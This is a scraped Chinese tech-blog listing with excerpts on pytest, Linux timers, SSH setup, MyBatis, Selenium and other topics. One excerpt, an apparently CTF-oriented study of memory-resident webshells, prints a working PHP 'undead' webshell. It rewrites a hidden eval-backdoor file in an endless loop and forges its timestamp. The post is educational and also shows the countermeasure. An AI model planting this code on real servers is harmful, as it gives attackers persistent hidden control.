报告多线程顺序控制 为什么要选择 Pytest 简单灵活 # content of test_sample.py def inc(x): return x + 1 def test_answer(): assert inc(3) == 5 为什么要选择 Pytest 兼容 unittest定制化插件开发 Pytest 安装与准备 Pytest 环境安装 前提：本地已配置完成 Python 环境第一种方式 pip install pytest第二种方式 PyCharm 直接安装 运行第一个脚本 # content of test_sample.py def inc(x): return x + 1 def test_answer(): assert inc(3) == 5 实操 1、创建目录 Desktop(桌面)/pytestdemo12、创建文件 test_first.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35552839fec6b8652c0a89aba19e9864/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5dc20715438644920f1cb5364f07033/" rel="bookmark">
			软件测试/测试开发丨Pytest 参数化用例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参数化 通过参数的方式传递数据，从而实现数据和脚本分离。并且可以实现用例的重复生成与执行。 参数化应用场景 测试登录场景
测试登录成功，登录失败(账号错误，密码错误)创建多种账号: 中⽂文账号，英⽂文账号 普通测试用例方法
Copy 多份代码 or 读⼊入参数?一次性执⾏多个输⼊入参数 def test_param_login_ok(): # 登录成功 username = "right" password = "right" login(username,password) def test_param_login_fail(): # 登录失败 username = "wrong" password = "wrong" login(username,password) 参数化实现方案 pytest 参数化实现方法装饰器：@pytest.mark.parametrize @pytest.mark.parametrize("username,password",[["right","right"], ["wrong","wrong"]]) def test_param(username,password): login(username,password) Mark：参数化测试函数使用 单参数多参数用例重命名笛卡尔积 参数化：单参数情况 单参数，可以将数据放在列表中 search_list = ['appium','selenium','pytest'] # 参数化实现测试用例的动态生成，每一条测试数据都会生成一条测试用例 @pytest.mark.parametrize('name',search_list) def test_search(name): assert name in search_list 参数化：多参数情况 将数据放在列表嵌套元组中将数据放在列表嵌套列表中 # 数据放在元组中 @pytest.mark.parametrize("test_input,expected",[ ("3+5",8),("2+5",7),("7+5",12) ]) def test_mark_more(test_input,expected): assert eval(test_input) == expected # 数据放在列表中 @pytest.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5dc20715438644920f1cb5364f07033/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0bb2f037fcd1ef4af56462c6172a62f/" rel="bookmark">
			【Linux驱动】内核定时器控制 LED 闪烁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux 提供了定时器，当超过预定时间时，就会触发回调函数，此外，Linux内核还提供了短延时函数，比如微秒、纳秒、毫秒延时函数。
一、内核定时器API 1、节拍数 内核定时器是通过节拍数来计时的，节拍数与时间存在关联性，在 include/asm-generic/param.h 中定义了一秒会产生多少次节拍数。由图中可知，当前系统一秒产生的节拍数为 100 次。
知道了节拍数的概念，接下来就不得不提一下全局变量 jiffies 了，jiffies 定义在文件 linux/jiffies.h 中，用于记录系统从启动以来的系统节拍数，类似于时间戳。由此可知定时器延时的基本原理，假设当前 jiffies = 1000，我们要延时2s（200次节拍），当 jiffies = 1000 + 200 时，说明定时的时间到了，此时就会执行相应的回调函数。
注意：jiffies既然是变量，那必然存在溢出的风险，溢出以后会 jiffies 重新从 0 开始计数
2、定时器数据结构 Linux内核提供了 struct timer_list 类型来表示定时器，timer_list 定义在文件 linux/timer.h 中。
struct timer_list { struct list_head entry; unsigned long expires; // 超时时间(单位: 节拍数) struct tvec_base *base; void (*function)(unsigned long); // 回调函数 unsigned long data; // 回调函数的参数 int slack; }; 超时时间: 超时时间其实是一个时间点，表示时间点的不是秒或者毫秒，而是触发回调的 jiffies 变量的值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0bb2f037fcd1ef4af56462c6172a62f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d65064e496dc451f45d23d32d6b9c4c/" rel="bookmark">
			在wps里导入Mathtype、改变字体
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 在wps里导入Mathtype 开发工具--加载项 2. 在“模板和加载项”窗口中再点击“添加”
3.找到mathtype安装路径下面的“OfficeSupprot”，这时会看到有“32”和“64”两个文件夹，分别对应WPS软件的系统（任务管理器可以直接查看wps版本）。默认路径为下边这个：
4. 至此已经完成添加
5. 如果许多功能不能用，是灰色的，可以安装一个wps vba插件，重启wps即可
6. wps插件链接（来自(1条消息) WPS再工具栏中添加mathtype_Wqrxdrd的博客-CSDN博客_wps安装mathtype）：
链接：https://pan.baidu.com/s/1qfKmc66IgY7VArUzSPMZkg
提取码：56g0
2 Mathtype公式大小和文本一样 1.大小不一致原因
查看Mathtype公式设置
可以看到文章中的公式大小值为10.5pt 也就是，五号字体，而word文章中的字号为四号字体，所以会出现大小不统一的情况。同样，手动去拖动Math type公式也会使得大小不一样。
2.字体的字号与磅(pt)和像素（px）之间的关系
字号与磅值是定义字体大小的2种度量单位，如同米和尺。“磅”（ pound，简写“Pt”）在表示字号其含义是一个长度单位，可以直接表达字符的实际尺寸。
磅与毫米的换算关系：pt＝0.35146约等于0.35mm，1mm约等于2.83pt，1英寸＝72pt，字高1厘米的字符，其磅数值大约为28.3Pt，
具体的换算表如下：
3.彻底解决方法
下面详细介绍具体的解决方法，彻底解决Mathtype字体大小问题。
修改Mathtype中公式的字体大小
然后将修改后的设置进行保存预制用于新公式。
这里也可以将预制保存到文件，点击上面的保存到文件，选择Mathtype预制保存的文件夹（在Mathtype软件安装目录下），设置名字后保存即可，以后使用可以直接导入保存的预制。
回到word中mathtype插件，打开公式预制可以看到字体大小14pt。但是这时候文章中的公式还是没有变，下面接着操作。
word中mathtype插件中点击格式化公式
转换完成
确定后可以看到所有的公式都正常显示了。
原文链接：https://blog.csdn.net/QH2107/article/details/129837107
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73d1a2d6bc584bc98a5360303c232315/" rel="bookmark">
			App测试中iOS和Android的差异
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、系统版本： iOS和Android系统版本的更新速度、使用人数比例以及功能的不同都可能导致应用程序在不同操作系统版本上的表现和兼容性存在区别。
例如，在iOS平台上，很多用户会更快地升级到最新版本的iOS系统，而在Android平台上，很多用户可能仍在使用较老的操作系统版本。因此，在测试时，需要确保应用程序能够在所有支持的操作系统版本上正常运行。
2、设备适配： iOS设备类型和型号相对较少，且硬件规格统一，因此，相较于Android设备，iOS设备的兼容性要高得多，但这并不意味着就不存在差异。不同型号的iPhone和iPad尺寸、分辨率等也是不同的，因此，需要确保应用程序可以适应不同型号和尺寸的iOS设备。而在Android平台上，由于设备种类繁多，还需要考虑不同厂商的定制化界面和其他特殊的硬件需求，如摄像头、传感器等。
3、应用商店审核： 在iOS平台上，应用必须通过苹果的审核才能上架，审核包括安全性、稳定性、隐私政策等方面，也必须符合苹果公司的设计规范。而对于Android平台上发布的应用程序，则可以由开发者自行发布，不需要经过审核。
4、编程语言： 在iOS平台上，开发人员通常使用Objective-C或Swift编写应用程序。Objective-C是一种老式的编程语言，而Swift是一个比较新的编程语言。在Android平台上，开发人员通常使用Java或Kotlin编写应用程序。这些编程语言在语法、API、内存管理等方面都有很大的差异，测试人员需要理解这些差异，并确保应用程序正确地实现了所需的功能。
5、用户体验： 在iOS和Android平台上，用户界面的布局、样式、颜色等方面也有很大的区别。例如，在iOS平台上，导航栏通常位于屏幕顶部，而在Android平台上通常位于底部。另外，在iOS平台上，系统提供了一套标准的UI控件，而在Android平台上，每个厂商可能都有自己的自定义UI控件。因此，在测试过程中，需要确保应用程序的用户界面在两个平台上都能够呈现出理想的效果，并且提供一致的用户体验。
总之，以上是iOS和Android在测试中的一些主要差异，测试人员需要考虑这些差异，并确保应用程序能够满足所有平台的要求，以提供最佳的用户体验。
最后感谢每一个认真阅读我文章的人，礼尚往来总是要有的，虽然不是什么很值钱的东西，如果你用得到的话可以直接拿走：
这些资料，对于【软件测试】的朋友来说应该是最全面最完整的备战仓库，这个仓库也陪伴上万个测试工程师们走过最艰难的路程，希望也能帮助到你！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff2dbb372b3930885e13e33bf5797801/" rel="bookmark">
			svn: warning: environment variable LC_ALL is en_US.UTF-8svn: warning: please check that your locale问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		svn update的时候抛出上述报错
解决方式，执行下面命令，重新同步即可
localedef -i en_US -f UTF-8 en_US.UTF-8
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab09ec556c0ea465656209dc7319e84c/" rel="bookmark">
			【解决方案】智能语音模块，东胜物联远场语音解决方案让控制更简单，应用于智能家居等场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现在的天气真是冷得不想多动一下，又想打开取暖器？有了它，用声音就能遥控，今天我们就来聊聊智能语音模块。
技术概述 远场语音技术，采用了麦克风阵列、信号处理技术以及先进的语音识别引擎，使得设备能够在距离麦克风数米到数十米的范围内捕捉、识别和理解用户的语音指令。被广泛应用于智能家居、车载娱乐、智慧医疗等各类场景。
产品优势 语音模组分为离线和离在线，具有全向远场语音识别的能力（360度全向麦克风），就近唤醒连接的设备，设置唤醒词多达上百条（具体可以参考下文）。
远场语音模块可广泛应用于智能微波炉、智能晾衣架、智能热水器等场景中。下面的视频我们以取暖器为例，展示语音模块DSFF-100的应用场景。
【解决方案】离线语音识别方案，智能家居控制更简单
产品优势 离线语音模组亮点： 低延时；低功耗；高稳定性
◎设备本地使用的语音识别技术，不需要连接互联网或云服务进行语音识别
离在线语音模组亮点： 支持WiFi2.4G；支持蓝牙；支持在线播放音乐，查询天气
◎前端语音处理，云端识别
语音模块解决方案 ◎可用于两季产品：暖风机、电风扇
◎可用于厨电产品：油烟机、微波炉
◎可用于智能晾衣架
◎可用于扫地机器人
更广泛的应用场景，等你来挖掘
东胜物联服务优势 东胜物联将为您带来：一站式ODM服务
关于东胜 东胜（Dusun）成立于2005年，以嵌入式软硬件开发及物联网通信技术为核心，为客户在物联网与行业应用结合过程中产生的“场景碎片化”问题，提供专业的一站式嵌入式物联网产品化解决方案。其产品服务体系包括嵌入式芯片解决方案、系统模块、核心板、工业控制主板、物联网网关，以及自有品牌的智能安防解决方案。
东胜（Dusun）凭借快速的ODM能力、专业服务能力、完整解决方案能力使其在行业享有不错的口碑。
其中，快速ODM能力可以支持多类型芯片平台、多操作系统、多标准功能模块化，快速满足客户的多样化需求，有效缩短产品开发周期，为客户灵活定制各种物联网嵌入式产品。
专业服务能力则具备多行业嵌入式解决方案经验，为开发者提供更优方案，降低客户应用物联网的成本。 基于自研的Sub-1G协议栈东胜（Dusun）提供完整的解决方案能力，提供远距离、高安全加密、简单易部署、高性价比的家用智能安防解决方案。
【喜报】浙江东胜物联技术有限公司加入深圳市物联网产业协会理事单位-CSDN博客
【智能家电】东胜物联离在线语音方案为厨电企业赋能，实现厨房智能化控制-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7774fd005b359f0d6f45eae13159931/" rel="bookmark">
			Linux实现ssh公钥登录的步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【3.5】实现Linux上SSH公钥认证的免密码登录需要按照以下步骤进行，这里以两台Linux主机A和B为例：
步骤1：在本地生成SSH密钥对 在主机A上，打开终端，输入以下命令：
ssh-keygen -t rsa 按照提示，选择生成SSH密钥对的类型（通常选择默认的RSA），然后可以选择是否设置密码（直接回车表示无密码）。
步骤2：将公钥复制到目标主机B 使用以下命令将生成的公钥复制到目标主机B上：
ssh-copy-id username@B 这会要求输入目标主机B的用户密码。输入后，公钥将被复制到B主机的~/.ssh/authorized_keys文件中。
步骤3：测试SSH连接 尝试使用SSH连接到目标主机B：
ssh username@B 如果一切设置正确，应该可以无密码登录到目标主机B。
验证是否成功： 成功情况：
执行ssh username@B时，应该直接登录到主机B而无需输入密码。如果执行ssh -v username@B，可以看到详细的调试信息，其中包括尝试使用公钥进行身份验证。 失败情况和解决方法：
文件权限： 如果~/.ssh 或 ~/.ssh/authorized_keys 的权限设置不正确，可能导致身份验证失败。确保这些目录的权限是安全的。chmod 700 ~/.ssh chmod 600 ~/.ssh/authorized_keys 公钥格式问题： 确保公钥的内容是正确的，没有多余的空格或换行符。SSH服务配置问题： 在目标主机B上，确保SSH服务已正确配置允许公钥身份验证。 注意事项： 在主机A上的~/.ssh/id_rsa.pub 文件是公钥文件，可以在其中找到复制到目标主机B的公钥。如果使用不同的用户名，确保在命令中替换username为目标主机B上的实际用户名。在SSH连接时，可以通过添加-v选项查看详细的调试信息，帮助诊断问题。 如果出现问题，根据错误信息进行调试，并根据上述失败情况和解决方法进行修复。
4.0
要在Linux系统中使用SSH公钥实现免密码登录，你需要在本地机器上生成一对密钥，并将公钥复制到远程服务器。以下是具体操作步骤及其命令。
在本地生成密钥对 打开一个终端。
运行 ssh-keygen 命令来生成新的密钥对。
ssh-keygen -t rsa -b 4096 -t rsa 指定了密钥类型为RSA，-b 4096 指定了密钥长度为4096位。
系统会提示你输入保存密钥对的文件名（默认为 ~/.ssh/id_rsa）。
接着系统会提示你输入密钥的密码短语（passphrase），不希望设置可以直接按回车跳过。
成功生成密钥后，你将看到如下信息：
Your identification has been saved in /your/home/directory/.ssh/id_rsa. Your public key has been saved in /your/home/directory/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7774fd005b359f0d6f45eae13159931/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e9762e427b2a6e28d1555b469af1697/" rel="bookmark">
			re:Invent2023技术上新｜使用Amazon Q Code Transformation升级Java应用程序（预览版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着应用程序的老化，要保证它们的安全和顺畅运行需要付出越来越多的努力。管理升级的开发人员必须花时间重新学习其他人在过去升级中已发现的重大变更和性能优化的复杂性和细微差别。因此，很难在新功能和基本维护工作之间取得平衡。
现在，我们将通过预览版介绍 Amazon Q Code Transformation。这项新功能使用 Amazon Q（一种由生成式 AI 驱动的新型助手）简化了现有应用程序代码的升级和现代化。Amazon Q 专为工作而设计，可根据您的业务进行量身定制。
Amazon Q Code Transformation 现在可以执行 Java 应用程序升级，从版本 8 和 11 升级到版本 17（Java 长期支持（LTS）版本），并且它很快就能将基于 Windows 的 .NET Framework 应用程序转换为跨平台 .NET。
以前，开发人员可能需要两到三天的时间来升级每个应用程序。我们的内部测试表明，与手动升级通常需要的几天或几周时间相比，使用转换功能可在几分钟内升级应用程序，从而腾出时间专注于新的业务需求。例如，一个由五人组成的 Amazon 内部团队在2天内成功地将一千个生产应用程序从 Java 8 升级到了17。升级应用程序平均只需10分钟，最长的一次不到一个小时。
Amazon Q Code Transformation 会自动分析现有代码、生成转换计划，并完成计划建议的转换任务。在此过程中，它会识别和更新包依赖项，重构过时和低效的代码组件，切换到新的语言框架并整合安全最佳实践。完成后，您可以查看转换后的代码以及构建和测试结果，然后再接受更改。
这样，您只需几步即可保持应用程序的更新并使其继续提供支持、获得性能优势，并消除因使用不支持的版本所产生的漏洞，从而腾出时间专注于新的业务需求。下面来看看这种新功能的实际应用。
将 Java 应用程序从版本 8 升级到 17
在本演示中，我使用的是 IntelliJ IDEA（同样可用于 Visual Studio Code）。若要在 IDE 中使用 Amazon Q Code Transformation，我需要安装最新版本的 Amazon Toolkit for IntelliJ IDEA，并使用我组织提供的 Amazon IAM Identity Center 凭证进行登录。请注意，若要使用 Amazon Q Code Transformation，则在组织使用的配置文件中，Amazon CodeWhisperer 管理员需要明确授予对 Azamon Q 功能的访问权限。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e9762e427b2a6e28d1555b469af1697/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af243ad4cced7c2a81631dfe3868dc30/" rel="bookmark">
			XPATH和Selenium爬取外网，遇到的问题汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近接到了一个需求，要爬取外网上的某个资源，小白边学边干，记录下遇到的问题及解决方式，希望有机会也可以帮助有同样困惑的家人们
一.外网无法登录 有一些外网即使你开了vpn和TUN模式，依然会被拦截请求，提示“不要使用VPN”或“所在地域受限制”，这是因为自身的ip地址有被泄露。
如果遇到这种情况，可以使用一个chrome插件，叫WebRTC Control
https://chrome.google.com/webstore/detail/webrtc-control/fjkmabmdepjfammlpliljpnbhleegehm?hl=zh-CN
下载后，开启即可
然后再尝试登录外网，应该会解决，亲测是有效果的
二.在Selenium打开的chrome浏览器中如何添加插件 默认selenium打开的浏览器是“裸”浏览器，什么插件都没有，这时可以使用selenium提供的语法
chrome_options.add_extension("crx文件本地下载路径") //例子 chrome_options.add_extension("E:/project/webrtc_control.crx") 这里要注意，这个方法内部要填写插件的crx文件本地下载路径，如果没有的话，拿到chrome插件的下载链接，到这个网站转换一下https://tool.lu/crx/即可，下载到本地后，将路径在方法中替换就好用啦
三.selenium开启隐藏浏览器模式 这里要注意，旧版headless隐藏模式是不支持携带插件的，这里被卡住好久
想实现隐藏浏览器且携带插件，使用
chrome_options.add_argument("--headless=new") 这种方式是新版的headless，支持隐藏浏览器且带插件！
四.拿到元素，但click()不生效 当终于找到某一元素时，发现click()点击不生效，简直太生气了
你可以尝试另外一种方式，即模拟鼠标点击
from selenium.webdriver import ActionChains driver = webdriver.Chrome(options=options) actions = ActionChains(driver) actions.click(videoDiv).perform() //videoDiv是通过XPATH拿到的element 如果你也遇到同样的问题，可以试试模拟鼠标点击
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60c2ea5f22e3e37e517cfd5b8d4b2b4f/" rel="bookmark">
			【数据库操作】insertSelective 的使用和特性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		insertSelective 是数据库操作中的一种插入记录的方法，通常与 MyBatis 或其他 ORM（对象关系映射）框架结合使用。
这个方法的作用是向数据库中插入一条记录，但与 insert 不同的是，insertSelective 只会插入那些指定了数值的字段，而忽略那些数值为 null 的字段。具体而言，如果一个字段在插入时没有指定数值，而数据库中定义了默认值，那么数据库会使用该字段的默认值。如果字段
为 null，并且数据库中没有默认值，那么 insertSelective 就不会插入该字段，让数据库使用默认值或者保持字段为 null。 insert 语句会插入所有字段，即使字段值为 null。
这个方法的目的是在插入记录时，只设置那些确实有值的字段，而对于没有值的字段则由数据库自行处理。
具体的语法和用法可能取决于所使用的 ORM 框架和数据库类型。以下是一个简单的例子，以 MyBatis 为例：
&lt;!-- MyBatis Mapper XML 文件中的例子 --&gt; &lt;insert id="insertSelective" parameterType="YourEntity"&gt; INSERT INTO your_table (column1, column2, column3) VALUES (#{property1}, #{property2}, #{property3}) &lt;/insert&gt; 在这个例子中，假设 YourEntity 是实体类，该实体类有对应的属性 property1、property2、property3 分别对应数据库表中的列 column1、column2、column3。在执行 insertSelective 操作时，只有那些有值的属性会被插入数据库。
insertSelective 语句只会插入那些字段值不为 null 的列。
&lt;!-- MyBatis Mapper XML 文件中的 insertSelective 语句 --&gt; &lt;insert id="insertSelective" parameterType="YourEntity"&gt; INSERT INTO your_table &lt;trim prefix="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60c2ea5f22e3e37e517cfd5b8d4b2b4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1243bd3fdcacd21b9493a0ac50e94da7/" rel="bookmark">
			内存马初识与浅析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言内存马基础原理 PHP内存马Tomcat内存马Servlet内存马Filter内存马Listen内存马 springboot内存马Interceptor内存马Controller内存马示例(打CC链子)踩坑 前言 虽然说实战还没遇到过要用到内存马的情况，但是在一些竞赛中经常会有不出网的应用，除了写文件之外，打内存马也是一个不错的选择，之前基本上没了解过内存马，现在来浅析一下。
内存马 内存马也称无文件落地Webshell，主要是通过操作Web程序的内存对象的形式来执行恶意代码，相相对普通的文件Webshell驻留后门，这种形式更难给检测和拦截，也就是说这种形式的Webshell隐蔽性更强。
基础原理 在Web应用程序中，比如说Java Web存在各种组件如Listener、Filter、Servlet等组件，这些组件用于处理请求和响应以及特定的操作。
Listener（监听器）是一种用于监视Web应用程序中特定事件的组件。它可以监听Web应用程序的生命周期事件（如启动、停止、初始化等），也可以监听特定类型的请求和会话事件（如请求到达、会话创建、销毁等）。它可以用来执行一些与事件相关的操作，如日志记录、统计、资源加载等。
Filter（过滤器）是一种可以对请求和响应进行预处理和后处理的组件。它可以在Servlet被调用之前对请求进行拦截，并在Servlet处理完请求后对响应进行处理。通过使用过滤器，可以对请求进行身份验证、数据转换、日志记录等操作，还可以对响应进行压缩、字符编码等操作。
Servlet（服务器小程序）是一种在Java Web应用程序中处理HTTP请求和生成响应的组件。Servlet通常用于动态生成Web页面、处理表单数据、调用业务逻辑等。Servlet类需要继承 HttpServlet 类，并且需要实现 doGet、doPost等方法，用来处理不同类型的请求。
内存马就是通过利用请求修改内存中已有的组件或者注册一个新的组件写入恶意代码，达到持久化、隐蔽控制服务器的目的，下文主要以是Java Web内存马的学习记录。
PHP内存马 php内存马其实也叫不死马，一般在CTF决赛的AWD进行攻防对抗的时候是经常用到的，这种马的原理也是比较简单，但是比一般的文件Webshell要难清除一些。
&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '.shell.php'; $code = '&lt;?php if(md5($_GET["pass"])=="bf124fb51e09438c2a8ef5c31e3146d3"){@eval($_POST['aiwin']);} ?&gt;'; while (1){ file_put_contents($file,$code); system('touch -m -d "2018-12-01 09:10:12" .shell.php'); usleep(3000); } ?&gt; ignore_user_abort(1);设置为true，表示忽略用户中止连接，即使与客户机断开，脚本也依旧会执行。
set_time_limit(0); 设置脚本的执行时间，设置为0表示没有时间限制。
unlink(\__FILE\__);删除文件本身。
usleep(3000);指延迟休眠3豪秒。
代码的意思就是断的通过 file_put_contents创建包含webshell的文件，前缀是.表示是隐藏文件，通过这种形式来达到不死马的效果。
至于这种不死马的克制也十分简单，它是间隔是3毫秒，只要你比它更快写将无害代码写入同名的文件中即可。
&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '.shell.php'; $code = 'no shell'; while (1){ file_put_contents($file,$code); system('touch -m -d "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1243bd3fdcacd21b9493a0ac50e94da7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02594af3bc16c133909c81fc9183729f/" rel="bookmark">
			SSH隧道远程连接局域网的电脑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 背景：我有一台公网ip的Ubuntu服务器，地址是：8.137.100.101，内网地址是：192.168.3.100。另外我有一台Windows 10的电脑打开了远程桌面登录，内网地址是：192.168.3.50。我想在任意的电脑上通过8.137.100.101来远程连接Windows10电脑。（无需安装任何程序，也无需提前配置）
方案：
如果有一台具有公网IP地址（8.137.100.101）的Ubuntu服务器和一个位于同一内网（192.168.3.x）的Windows 10电脑，可以通过SSH隧道来实现远程连接到Windows 10电脑。
1.在Windows 10电脑上开启远程桌面：
确保远程桌面功能已开启。记下Windows 10电脑的内网IP地址（192.168.3.50）。 2.在Ubuntu服务器上设置SSH隧道：
确保您的Ubuntu服务器上安装了SSH服务。在任意外部电脑上，使用SSH命令创建到Ubuntu服务器的隧道，并将流量转发到Windows 10电脑的远程桌面端口。命令示例： ssh -L [本地端口]:192.168.3.50:3389 [Ubuntu用户]@8.137.100.101 # 例如 ssh -L 8888:192.168.3.50:3389 root@8.137.100.101 这里，[本地端口]可以是选择的任意未被占用的端口，例如8888。
3.通过SSH隧道连接：
在同一台电脑上打开远程桌面连接工具。连接到localhost:[本地端口]，例如localhost:8888。输入Windows 10的登录凭据。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cbe12cd05947a6d5939715b79e86e90/" rel="bookmark">
			基于Mbed Studio环境下开发STM32
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于Mbed Studio环境下开发STM32 📍Mbed官网：https://os.mbed.com/ ✨mbed OS是ARM出的一个免费开源的，面向物联网的操作系统。提供了一个定义良好的API来开发C++应用程序；集成度很高，类似Arduino，目前并不兼容所有STM32型号，大容量的基本都支持，中小容量的没有全部覆盖，也不推荐在此系统上使用。目前提供了三种开发模式：Keil Studio Cloud、Mbed Studio、Mbed CLI。
👉使用必须要注册账号。🔖如果使用Mbed Studio IDE开发，推荐使用云编译器，占用本地磁盘空间比较小。（转为本地的话，整个工程+系统需要占用1.5GB左右的磁盘空间）。🌿使用Keil Studio Cloud网页版,在线编译速度最快。 📝串口输出+点灯示例 🔖编译器版本：mbed-os 6.13.0 #include "mbed.h" // Blinking rate in milliseconds #define BLINKING_RATE 500ms BufferedSerial pc(PA_2, PA_3); // usart2 PA2-&gt;TX2 PA3-&gt;RX2 FileHandle *mbed::mbed_override_console(int fd) { return &amp;pc; } int main() { pc.set_blocking(false); // 设置为非阻塞模式 pc.set_baud(115200); // 设置波特率为115200 // Initialise the digital pin LED1 as an output DigitalOut led(PC_13);//设置引脚输出模式 DigitalOut led2(PA_5); while (true) { led = !led; led2 = !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cbe12cd05947a6d5939715b79e86e90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b014baef1160f1896f51ef2e38eae47/" rel="bookmark">
			Java-多线程(基础)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一 . 进程和线程
1.1 进程
1.2 线程
1.3 进程和线程的关系
二 . 多线程的三种创建方式
2.1 Thread类
2.2 三种创建方式
2.3 方法解析
线程启动
中断线程
等待一个线程 join() 三 . 线程的状态(了解)
四 . 线程安全问题(重点)
概念
线程不安全的例子
线程不安全的原因
内存可见性
指令重排序
五 . synchronized 关键字
5.1 synchronized 的特性
1) 互斥
2) 刷新内存
3) 可重入
5.2 . Java标准库中的线程安全类
六 . volatile 关键字
七 . wait和notify
7.1 wait()方法
7.2 notify()方法
7.3 notifyAll()方法
7.4 wait 和 sleep 的对比
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b014baef1160f1896f51ef2e38eae47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6fe1ccf1242e25f44d4af482ed7e9a3b/" rel="bookmark">
			教你如何为自己的个人网站选择SSL证书？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在互联网飞速发展的今天，各类互联网技术和工具日新月异，越来越多的人都可以低技术门槛来开办自己的独立博客、自媒体、个人站点等通过这些平台来发布自己想要公开的资讯，或者以此来提供相关的网络服务以及展示、销售自己的作品、商品。殊不知，网络在给我们提供便利的同时，网络信息安全隐患也悄悄降临在我们头上，这里面虽然看不见刀光剑影，却也危机四伏。
开办个人站点，除了开发或者利用现成的网站程序来开通运营之外，网站的数据安全同样不容小觑。个人站点中关乎安全的一个重要环节：如何选择SSL证书来提升网站的安全性。
SSL证书，即帮助网站实现从明文传输的“http”模式转换为加密的“https”安全模式的一种数字证书。
SSL证书其实有免费版和正式版。免费版SSL证书一般仅供个人研究测试之用，其局限性很多。我们通常不建议大家用免费的SSL证书。虽然在价格上免费的SSL证书不需要成本，但由于申请过程繁杂需要的人力成本会更大。
那么，我们该如何为自己的网站选择合适的证书呢?我们只需要明确以下三个方面的问题。
1，不同类型的证书该如何选择 SSL证书根据验证类型分为DVSSL证书、OVSSL证书和EVSSL证书，其中OVSSL是企业型证书，EVSSL是增强型证书，这两款证书均需以单位身份申请，EVSSL可以在浏览器地址栏上直接显示公司名称，在申请OV和EV的时候需要验证企业的真实身份，个人网站只能申请DVSSL。
SSL证书根据版本分为单域名版，多域名版，通配符版和多域名通配符版。如果您的网站只有一个域名，选择单域名版即可，例如Comodo positive ssl，Geotrust Quick ssl这几款都可供您选择；如果您的网站有多个域名则选择多域名版；如果您的网站在同一个主域名下还有多个子域名，您可以选择通配符版SSL。
2，品牌不同、类型不同，证书的价格也不同 如果您想要便宜的单域名证书，那么Comodo positive ssl真是再好不过了；如果您想要便宜的多域名证书，推荐positive ssl Multi-domain，是同类型证书中价格最低的品牌，如果您想要以便宜的价格买到通配符证书，Comodo PositiveSSL Wildcard Certificate是您最好的选择。
3，好的证书就如同好的“门面”，可以给您增加不少的印象分 选择一款好的证书不仅可以使您的网站更安全，浏览器中小锁图标所包含的信息可以让浏览者知道您的真实身份，甚至更有可能会提升您的网站在同类型网站中的排名和点击率，Digicert旗下的产品GeotrustQuick ssl就很不错。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08e6a84d1fd6cdb35f4f98633ca40855/" rel="bookmark">
			ROS学习记录：如何在Github上寻找并安装软件包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
